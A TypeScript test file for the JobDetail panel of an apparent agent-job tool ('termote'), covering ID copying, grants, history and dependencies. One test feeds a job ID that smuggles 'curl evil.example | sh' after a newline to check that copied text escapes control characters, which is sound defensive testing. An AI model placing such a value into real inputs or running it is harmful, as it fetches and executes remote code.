import { act, fireEvent, render, screen, within } from '@testing-library/react'
import { beforeEach, describe, expect, it, vi } from 'vitest'

const { mockRevoke, mockCopy } = vi.hoisted(() => ({
  mockRevoke: vi.fn(),
  mockCopy: vi.fn(),
}))
vi.mock('../utils/copy-text', () => ({
  copyText: (...a: unknown[]) => mockCopy(...a),
}))
vi.mock('../hooks/use-jobs', async (orig) => ({
  ...(await orig<typeof import('../hooks/use-jobs')>()),
  revokeJobGrant: (...a: unknown[]) => mockRevoke(...a),
}))

import { type Job, type JobGrant, RequestError } from '../hooks/use-mux-api'
import { UNSAFE_CHARS } from '../utils/unsafe-chars'
import { JobDetail } from './job-detail'

const NOW = Date.parse('2026-11-23T10:00:00Z')
const ago = (min: number) => new Date(NOW - min * 60_000).toISOString()

const agent = { key: 'k', paneId: '%1', kind: 'claude', ref: 'w:old' }
const grant = (over: Partial<JobGrant> = {}): JobGrant => ({
  id: 'g1',
  agent,
  kind: 'bash',
  prefix: 'pnpm test',
  created: ago(30),
  expires: ago(-60),
  ...over,
})

const job = (over: Partial<Job> = {}): Job => ({
  id: 'a',
  title: 'Fix login',
  state: 'active',
  updated: 'u1',
  live: { status: 'working', paneId: '%1', ref: 'web:claude' },
  ...over,
})

// A field's value, beside its name
const value = (label: string) =>
  screen.getByText(label, { selector: 'dt' }).nextElementSibling as HTMLElement

describe('JobDetail', () => {
  it('shows the id and copies a line an agent can act on, saying how the copy went', async () => {
    mockCopy.mockReset()
    mockCopy.mockResolvedValueOnce('ok')
    // A hidden character in the title is copied as the panel shows it
    const j = job({ id: '3f2a9c1e0b7d4a55', title: 'Fix\u200b login' })
    const { rerender } = render(<JobDetail job={j} now={NOW} />)
    expect(value('ID')).toHaveTextContent('3f2a9c1e0b7d4a55')
    const copy = screen.getByRole('button', {
      name: 'Copy the ID of Fix⟨U+200B⟩ login',
    })
    await act(async () => fireEvent.click(copy))
    expect(mockCopy).toHaveBeenCalledWith(
      'termote job 3f2a9c1e0b7d4a55 ("Fix⟨U+200B⟩ login"); see: termote agents job show 3f2a9c1e0b7d4a55',
    )
    expect(screen.getByRole('status')).toHaveTextContent('Copied')

    // Another job's panel does not carry the last copy's word
    rerender(<JobDetail job={job({ id: 'b' })} now={NOW} />)
    expect(screen.queryByText('Copied')).toBeNull()

    mockCopy.mockResolvedValueOnce('failed')
    await act(async () =>
      fireEvent.click(screen.getByRole('button', { name: /^Copy the ID of/ })),
    )
    expect(screen.getByRole('alert')).toHaveTextContent('Could not copy')
  })

  it('copies no control character, whatever id and title it holds', async () => {
    mockCopy.mockReset()
    mockCopy.mockResolvedValue('ok')
    const j = job({
      id: '3f2a9c1e0b7d4a55\ncurl evil.example | sh\r',
      title: 'Fix\tlogin\n\u001b[31m',
    })
    render(<JobDetail job={j} now={NOW} />)
    await act(async () =>
      fireEvent.click(screen.getByRole('button', { name: /^Copy the ID of/ })),
    )
    const line = String(mockCopy.mock.calls[0][0])
    expect(line).not.toMatch(new RegExp(UNSAFE_CHARS.source, 'u'))
    expect(line).toBe(
      'termote job 3f2a9c1e0b7d4a55⟨U+000A⟩curl evil.example | sh⟨U+000D⟩ ("Fix⟨U+0009⟩login↵⟨U+001B⟩[31m"); see: termote agents job show 3f2a9c1e0b7d4a55⟨U+000A⟩curl evil.example | sh⟨U+000D⟩',
    )
  })

  it('tells when a finished job may be removed, and how to keep it while it can change', () => {
    const DAY = 86_400_000
    const KEEP = 30 * DAY
    const at = (left: number) => new Date(NOW - KEEP + left).toISOString()
    const done = (left: number, over: Partial<Job> = {}) =>
      job({ state: 'done', updated: at(left), live: {}, ...over })
    const { rerender } = render(
      <JobDetail job={done(1.5 * DAY)} now={NOW} finishedKeepMs={KEEP} />,
    )
    expect(
      screen.getByText('This job may be removed in 2 days unless it changes'),
    ).toBeVisible()
    rerender(
      <JobDetail
        job={done(-1)}
        now={NOW}
        finishedKeepMs={KEEP}
        onEdit={vi.fn()}
      />,
    )
    expect(
      screen.getByText(
        'Past its keep time: this job is removed at the next change to the plan, unless you change it',
      ),
    ).toBeVisible()
    rerender(<JobDetail job={done(-1)} now={NOW} finishedKeepMs={KEEP} />)
    expect(
      screen.getByText(
        'Past its keep time: this job is removed at the next change to the plan',
      ),
    ).toBeVisible()
    // Far off, unfinished, or a server that keeps no limit: nothing
    for (const el of [
      <JobDetail
        key="far"
        job={done(10 * DAY)}
        now={NOW}
        finishedKeepMs={KEEP}
      />,
      <JobDetail
        key="active"
        job={done(-1, { state: 'active' })}
        now={NOW}
        finishedKeepMs={KEEP}
      />,
      <JobDetail key="none" job={done(-1)} now={NOW} />,
    ]) {
      rerender(el)
      expect(screen.queryByText(/removed/)).toBeNull()
    }
  })

  it('takes the word of the last copy away after a moment', async () => {
    vi.useFakeTimers()
    try {
      mockCopy.mockReset()
      mockCopy.mockResolvedValueOnce('ok')
      render(<JobDetail job={job()} now={NOW} />)
      await act(async () =>
        fireEvent.click(
          screen.getByRole('button', { name: /^Copy the ID of/ }),
        ),
      )
      expect(screen.getByRole('status')).toHaveTextContent('Copied')
      act(() => vi.advanceTimersByTime(2000))
      expect(screen.queryByRole('status')).toBeNull()
    } finally {
      vi.useRealTimers()
    }
  })

  it('shows the pull requests only where the server follows them, and what a ci grant sent', () => {
    const j = job({
      agent,
      ci: {
        prs: [
          { number: 12, repo: 'github.com/o/r', state: 'open', checks: 'fail' },
        ],
      },
      grants: [
        grant({
          kind: 'ci',
          prefix: undefined,
          uses: [{ at: ago(3), command: '12@abc,15@def' }, { at: ago(4) }],
        }),
      ],
      events: [{ at: ago(3), kind: 'ci_sent', text: 'sent CI failure of #12' }],
    })
    const { rerender } = render(<JobDetail job={j} now={NOW} />)
    expect(screen.queryByTestId('job-ci')).toBeNull()
    expect(screen.getByText('Sent on their own: #12, #15')).toBeVisible()
    // A use with no set recorded names none
    expect(
      screen.getAllByText(/^Sent on their own:/).map((e) => e.textContent),
    ).toEqual(['Sent on their own: #12, #15', 'Sent on their own: '])
    expect(screen.getByText('Failed checks sent to the agent')).toBeVisible()
    rerender(<JobDetail job={j} now={NOW} ciAvailable />)
    expect(screen.getByTestId('job-ci')).toBeVisible()
  })

  it('shows every field a full client gets: prompt, note, folder, answers, history', () => {
    render(
      <JobDetail
        job={job({
          agent,
          prompt: 'Do it\nwell',
          note: 'careful',
          worktree: { branch: 'feat/x', dir: '/w/x' },
          diff: { commits: 2, files: 1, at: ago(2) },
          grants: [
            grant({
              uses: [
                { at: ago(10), command: 'pnpm test a' },
                { at: ago(2), path: 'src/a.ts' },
                { at: ago(5) },
              ],
            }),
            grant({ id: 'g2', kind: 'edit', prefix: undefined }),
            grant({ id: 'g3', revoked: ago(1) }),
          ],
          events: [
            { at: ago(30), kind: 'created' },
            { at: ago(20), kind: 'state', text: 'review' },
            { at: ago(15), kind: 'state', text: 'weird' },
            { at: ago(12), kind: 'agent', text: 'w:t' },
            { at: ago(3), kind: 'future_kind' },
            { at: ago(-5), kind: 'constructor' },
          ],
          updated: ago(4),
        })}
        now={NOW}
      />,
    )
    const field = (label: string) =>
      screen.getByRole('heading', { name: label }).parentElement!
    expect(screen.getByText('Working').parentElement).toHaveTextContent(
      'Working · 4 min ago',
    )
    expect(value('State')).toHaveTextContent('Active')
    expect(value('Agent')).toHaveTextContent('Claude Code · w:old')
    expect(value('Branch')).toHaveTextContent('feat/x')
    expect(value('Folder')).toHaveTextContent('/w/x')
    expect(value('Changes')).toHaveTextContent('2 commits · 1 file changed')
    expect(field('Prompt')).toHaveTextContent('Do it well')
    expect(field('Note')).toHaveTextContent('careful')
    expect(
      within(field('Grants in force'))
        .getAllByRole('listitem')
        .map((l) => l.textContent),
    ).toEqual([
      'Run: pnpm testEnds in 1 h · used 3 times',
      'Edit files in the worktreeEnds in 1 h · used 0 times',
    ])
    expect(
      within(field('Answered under a grant'))
        .getAllByRole('listitem')
        .map((l) => l.textContent),
    ).toEqual(['src/a.ts2 min ago', '5 min ago', 'pnpm test a10 min ago'])
    expect(
      within(field('History'))
        .getAllByRole('listitem')
        .map((l) => l.textContent),
    ).toEqual([
      'constructorjust now',
      'future_kind3 min ago',
      'Given to an agent: w:t12 min ago',
      'State changed: weird15 min ago',
      'State changed: Review20 min ago',
      'Added30 min ago',
    ])
  })

  it('draws no field it has no data for, and no button it is not given', () => {
    render(
      <JobDetail
        job={job({ live: {}, state: 'todo', updated: 'u' })}
        now={NOW}
      />,
    )
    expect(screen.queryByRole('heading')).toBeNull()
    expect(
      [...document.querySelectorAll('dt')].map((d) => d.textContent),
    ).toEqual(['State', 'ID'])
    // Every job has an id, so its copy button is the only one
    expect(
      screen.getAllByRole('button').map((b) => b.getAttribute('title')),
    ).toEqual(['Copy ID'])
  })

  it('names an agent it does not know by the kind the server recorded', () => {
    render(
      <JobDetail
        job={job({ agent: { key: 'k', paneId: '%3', kind: 'ai\u202eder' } })}
        now={NOW}
      />,
    )
    expect(value('Agent')).toHaveTextContent('ai⟨U+202E⟩der · %3')
  })

  it("shows a job's pane folder and branch when it has no worktree", () => {
    render(
      <JobDetail
        job={job({
          live: {
            status: 'idle',
            paneId: '%1',
            dir: '/src/web',
            branch: 'main',
          },
        })}
        now={NOW}
      />,
    )
    expect(screen.getByText('main')).toBeInTheDocument()
    expect(screen.getByText('/src/web')).toBeInTheDocument()
  })

  it("shows its agent's pane folder and branch once it left the worktree", () => {
    render(
      <JobDetail
        job={job({
          worktree: { branch: 'job-x', dir: '/wt/job-x' },
          live: {
            status: 'idle',
            paneId: '%1',
            dir: '/src/termote',
            branch: 'main',
            outsideWorktree: true,
          },
        })}
        now={NOW}
      />,
    )
    expect(screen.getByText('main')).toBeInTheDocument()
    expect(screen.getByText('/src/termote')).toBeInTheDocument()
    expect(screen.queryByText('/wt/job-x')).toBeNull()
  })

  it('counts the grants in force on its Grants button', () => {
    render(
      <JobDetail
        job={job({ grants: [grant(), grant({ id: 'g2' })] })}
        now={NOW}
        onGrants={vi.fn()}
      />,
    )
    expect(
      screen.getByRole('button', { name: 'Grants of Fix login' }),
    ).toHaveTextContent('Grants · 2')
  })

  it('opens the pane, the grants and the editor', () => {
    const onOpenPane = vi.fn()
    const onEdit = vi.fn()
    const onGrants = vi.fn()
    const j = job()
    render(
      <JobDetail
        job={j}
        now={NOW}
        onOpenPane={onOpenPane}
        onEdit={onEdit}
        onGrants={onGrants}
      />,
    )
    fireEvent.click(
      screen.getByRole('button', { name: 'Open pane web:claude' }),
    )
    expect(onOpenPane).toHaveBeenCalledWith('%1')
    fireEvent.click(screen.getByRole('button', { name: 'Grants of Fix login' }))
    expect(onGrants).toHaveBeenCalledWith(j)
    // No grant in force: the button says Grants alone
    expect(
      screen.getByRole('button', { name: 'Grants of Fix login' }),
    ).toHaveTextContent(/^Grants$/)
    fireEvent.click(screen.getByRole('button', { name: 'Edit Fix login' }))
    expect(onEdit).toHaveBeenCalledWith(j)
  })

  it('shows the hidden characters of the title, branch, folder, prompt and note', () => {
    render(
      <JobDetail
        job={job({
          title: 'Fix\u202elogin',
          prompt: 'a\u200bb',
          note: 'c\u2066d',
          worktree: { branch: 'b\u202er', dir: '/w\u200b' },
        })}
        now={NOW}
        onEdit={vi.fn()}
      />,
    )
    expect(
      screen.getByRole('button', { name: 'Edit Fix⟨U+202E⟩login' }),
    ).toBeInTheDocument()
    expect(screen.getByText('b⟨U+202E⟩r')).toBeInTheDocument()
    expect(screen.getByText('/w⟨U+200B⟩')).toBeInTheDocument()
    expect(screen.getByText('a⟨U+200B⟩b')).toBeInTheDocument()
    expect(screen.getByText('c⟨U+2066⟩d')).toBeInTheDocument()
  })

  describe('ending a grant', () => {
    beforeEach(() => {
      mockRevoke.mockReset()
      HTMLDialogElement.prototype.showModal = vi.fn(function (
        this: HTMLDialogElement,
      ) {
        this.setAttribute('open', '')
      })
      HTMLDialogElement.prototype.close = vi.fn()
    })
    const endButton = () =>
      screen.queryByRole('button', { name: 'End the grant Run: pnpm test' })
    const confirm = async () => {
      fireEvent.click(endButton()!)
      const dialog = screen.getByRole('dialog', { name: 'End this grant?' })
      expect(dialog).toHaveTextContent('Run: pnpm test')
      await act(async () => {
        fireEvent.click(within(dialog).getByRole('button', { name: 'End' }))
      })
    }

    it('offers End only where this browser may end grants', () => {
      const { rerender } = render(
        <JobDetail job={job({ grants: [grant()] })} now={NOW} />,
      )
      expect(endButton()).toBeNull()
      rerender(
        <JobDetail job={job({ grants: [grant()] })} now={NOW} canEndGrants />,
      )
      expect(endButton()).toBeInTheDocument()
    })

    it('ends a grant once confirmed, and says so', async () => {
      mockRevoke.mockResolvedValue(undefined)
      const j = job({ grants: [grant()] })
      render(<JobDetail job={j} now={NOW} canEndGrants />)
      // Cancel ends nothing
      fireEvent.click(endButton()!)
      fireEvent.click(
        within(
          screen.getByRole('dialog', { name: 'End this grant?' }),
        ).getByRole('button', { name: 'Cancel' }),
      )
      expect(mockRevoke).not.toHaveBeenCalled()
      await confirm()
      expect(mockRevoke).toHaveBeenCalledWith(j, 'g1')
      expect(screen.getByRole('status')).toHaveTextContent('The grant ended')
    })

    it('tells a refused end, in the server words or its own', async () => {
      mockRevoke.mockRejectedValueOnce(
        new RequestError(404, 'grant_not_found', 'x'),
      )
      render(
        <JobDetail job={job({ grants: [grant()] })} now={NOW} canEndGrants />,
      )
      await confirm()
      expect(screen.getByRole('alert')).toHaveTextContent(
        'This grant no longer exists',
      )
      mockRevoke.mockRejectedValueOnce(new Error('offline'))
      await confirm()
      expect(screen.getByRole('alert')).toHaveTextContent(
        'Could not change the grants',
      )
      // A later end that works clears the refusal
      mockRevoke.mockResolvedValueOnce(undefined)
      await confirm()
      expect(screen.queryByRole('alert')).toBeNull()
      expect(screen.getByRole('status')).toHaveTextContent('The grant ended')
    })
  })

  describe('priority, dependencies and workspace', () => {
    const others = [
      job({ id: 'b', title: 'Write docs', state: 'done' }),
      job({ id: 'c', title: 'Fix CI', state: 'failed' }),
      job({ id: 'd', title: 'Release', state: 'todo', after: ['a'] }),
    ]
    const section = (name: string) =>
      screen.getByRole('heading', { name }).parentElement as HTMLElement

    it('shows the priority and the workspace by name, else its id', () => {
      const { rerender } = render(
        <JobDetail
          job={job({ priority: 'high', workspace: 'w1' })}
          now={NOW}
          groups={[{ id: 'w1', name: 'acme-api' }]}
        />,
      )
      expect(value('Priority')).toHaveTextContent('High priority')
      expect(value('Workspace')).toHaveTextContent('acme-api')
      rerender(
        <JobDetail
          job={job({ priority: 'low', workspace: 'w9', workspaceNow: 'w8' })}
          now={NOW}
        />,
      )
      expect(value('Priority')).toHaveTextContent('Low priority')
      expect(value('Workspace')).toHaveTextContent('w8')
      rerender(<JobDetail job={job()} now={NOW} />)
      expect(screen.queryByText('Priority', { selector: 'dt' })).toBeNull()
      expect(screen.queryByText('Workspace', { selector: 'dt' })).toBeNull()
    })

    it('lists the jobs it waits on with their state, each opening its details', () => {
      const onOpenJob = vi.fn()
      render(
        <JobDetail
          job={job({ after: ['b', 'c', 'ffffffffffffffff'] })}
          now={NOW}
          jobs={[job(), ...others]}
          onOpenJob={onOpenJob}
        />,
      )
      const list = within(section('Waits on'))
      expect(list.getAllByRole('listitem').map((li) => li.textContent)).toEqual(
        ['Write docsDone', 'Fix CIFailed', 'A job no longer in the plan'],
      )
      expect(list.getByText('Failed')).toHaveClass('text-danger')
      fireEvent.click(list.getByRole('button', { name: 'Fix CI' }))
      expect(onOpenJob).toHaveBeenCalledWith('c')
      // Those waiting on it
      const needed = within(section('Needed by'))
      fireEvent.click(needed.getByRole('button', { name: 'Release' }))
      expect(onOpenJob).toHaveBeenLastCalledWith('d')
    })

    it('names the jobs without a link where none opens', () => {
      render(<JobDetail job={job()} now={NOW} jobs={others} />)
      expect(within(section('Needed by')).getByText('Release')).toBeVisible()
      expect(screen.queryByRole('button', { name: 'Release' })).toBeNull()
      expect(screen.queryByRole('heading', { name: 'Waits on' })).toBeNull()
    })

    it('tells the history lines of a change of priority, dependencies or workspace', () => {
      render(
        <JobDetail
          job={job({
            events: [
              { at: ago(4), kind: 'priority', text: 'high' },
              { at: ago(3), kind: 'after', text: '+b' },
              { at: ago(2), kind: 'workspace', text: 'w1' },
              { at: ago(1), kind: 'deps', text: 'b removed' },
            ],
          })}
          now={NOW}
        />,
      )
      for (const words of [
        'Priority changed',
        'Jobs it waits on changed',
        'Workspace changed',
        'A job it waited on left the plan',
      ])
        expect(screen.getByText(words)).toBeVisible()
    })
  })
})
